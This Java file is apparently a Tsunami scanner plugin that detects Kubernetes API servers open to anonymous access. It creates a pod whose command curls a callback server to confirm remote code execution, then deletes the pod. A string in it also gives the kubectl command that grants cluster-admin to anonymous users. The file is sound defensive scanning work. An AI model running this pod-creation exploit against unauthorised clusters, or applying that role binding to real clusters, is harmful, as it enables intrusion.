/*
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.kubernetes;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A Tsunami plugin that detects RCE in Kubernetes Cluster with Open Access */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "RCEInKubernetesClusterWithOpenAccessDetector",
    version = "0.1",
    description = "This plugin detects RCE in Kubernetes Cluster with Open Access.",
    author = "Dawid Golunski (dawid@doyensec.com)",
    bootstrapModule = RCEInKubernetesClusterWithOpenAccessDetectorBootstrapModule.class)
public final class RCEInKubernetesClusterWithOpenAccessDetector implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";

  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "KUBERNETES_WITH_OPEN_ACCESS";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE = "Kubernetes Open Access Remote Code Execution";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION =
      "The scanner detected that a Kubernetes service allows anonymous access. This allows"
          + " attackers to execute arbitrary code by creating a new pod. A kubernetes cluster could"
          + " be configured to allow open access by creating a role to  allow anonymous users"
          + " (system:anonymous) to perform any action in a cluster with: \n"
          + " kubectl create clusterrolebinding cluster-system-anonymous"
          + " --clusterrole=cluster-admin --user=system:anonymous \n"
          + " See:  https://www.cncf.io/blog/2018/08/01/demystifying-rbac-in-kubernetes/"
          + " https://github.com/kubernetes-sigs/apiserver-builder-alpha/issues/225 for more"
          + " information.\n"
          + "Details on the scanner logic:\n"
          + " The scanner was able to create a pod using /api/v1/namespaces/default/pods API"
          + " endpoint without authentication. By bringing up a pod with container command:\n"
          + " `curl` that sends a request to a callback server to confirm RCE.\n"
          + " Note that the scanner subsequently cleaned up the created container with DELETE"
          + " request to the /api/v1/namespaces/default/pods/tsunami-rce-pod API endpoint.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION =
      "Disable anonymous access to the api by starting kube-apiserver with --anonymous-auth=false."
          + " Plus remove excessive privileges from the system:anonymous user."
          + " https://goteleport.com/blog/kubernetes-api-access-security/";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DETAILS =
      "Attacker can create new Kubernetes pods which can allow them to execute system commands";

  // This plugin sets the severity to High if a pod was created, or raises it to Critical
  // if the RCE payload was executed on the target
  Severity vulnSeverity = Severity.HIGH;

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final String payloadFormatString;

  @VisibleForTesting
  static final String RCE_POD_NAME =
      "tsunami-rce-pod-" + Long.toHexString(Double.doubleToLongBits(Math.random()));

  @Inject
  RCEInKubernetesClusterWithOpenAccessDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
      throws IOException {
    this.utcClock = checkNotNull(utcClock);

    this.httpClient = checkNotNull(httpClient);

    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.payloadFormatString =
        String.format(
            Resources.toString(
                Resources.getResource(this.getClass(), "payloadFormatString.json"), UTF_8),
            RCE_POD_NAME,
            "%s"); // Placeholder for the command payload
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("RCEInKubernetesClusterWithOpenAccessDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  // Checks whether a given Kubernetes service is exposed and vulnerable.
  private boolean isServiceVulnerable(NetworkService networkService) {

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    // Pass in the config to get the actual payload from the generator.
    // If the Tsunami callback server is configured, the generator will always try to return a
    // callback-enabled payload.
    Payload payload = this.payloadGenerator.generate(config);
    String commandToInject = payload.getPayload();
    String reqPayload = String.format(payloadFormatString, commandToInject);
    boolean isVulnerable = false;

    // Create a new Kubernetes Pod with RCE payload in container command args
    boolean isPodCreated = createPod(networkService, RCE_POD_NAME, reqPayload);
    if (!isPodCreated) {
      logger.atInfo().log("Failed to create a pod. Not vulnerable.");
      return false;
    } else {
      logger.atInfo().log("Pod %s created on the target", RCE_POD_NAME);
      // Report as vulnerable with High severity
      isVulnerable = true;
    }

    // Use callback for RCE confirmation and raise severity on success
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log("Target vulnerable, but callback server is disabled to confirm RCE");
    } else {
      // If there is an RCE, the execution isn't immediate
      logger.atInfo().log("Waiting for RCE callback.");
      try {
        Thread.sleep(10000);
      } catch (InterruptedException e) {
        logger.atWarning().withCause(e).log("Failed to wait for RCE result");
      }
      // Raise the severity to Critical
      if (payload.checkIfExecuted()) {
        logger.atInfo().log("RCE payload executed! (Critical)");
        vulnSeverity = Severity.CRITICAL;
      }
    }

    // Cleanup by removing the created pod
    var unused = deletePod(networkService, RCE_POD_NAME);

    return isVulnerable;
  }

  private boolean createPod(NetworkService networkService, String podName, String payload) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "api/v1/namespaces/default/pods";
    logger.atInfo().log("Creating pod via Kubernetes service at '%s'", targetUri);

    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build();

    try {
      HttpResponse response = this.httpClient.send(req, networkService);
      if (response.status().code() == HttpStatus.CREATED.code()
          && response.bodyString().map(body -> body.contains(RCE_POD_NAME)).orElse(false)) {
        logger.atInfo().log("Pod '%s' created.", podName);
        return true;
      } else {
        logger.atInfo().log(
            "Unable to create pod '%s' (status: %d and body: %s).",
            podName, response.status().code(), response.bodyString());
        return false;
      }

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to query '%s'.", targetUri);
      return false;
    }
  }

  private boolean deletePod(NetworkService networkService, String podName) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "api/v1/namespaces/default/pods/"
            + podName;

    logger.atInfo().log("Deleting Kubernetes pod at '%s'", targetUri);

    HttpRequest req =
        HttpRequest.delete(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .build();

    try {
      HttpResponse response = this.httpClient.send(req, networkService);
      if (response.status().isSuccess()
          && response.bodyString().map(body -> body.contains(RCE_POD_NAME)).orElse(false)) {
        logger.atInfo().log("Pod '%s' deleted.", podName);
        return true;
      } else {
        logger.atWarning().log(
            "Unable to delete pod '%s'. Response status %s", podName, response.status());
        return false;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to query '%s'.", targetUri);
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(vulnSeverity)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(TextData.newBuilder().setText(VULNERABILITY_REPORT_DETAILS))))
        .build();
  }
}
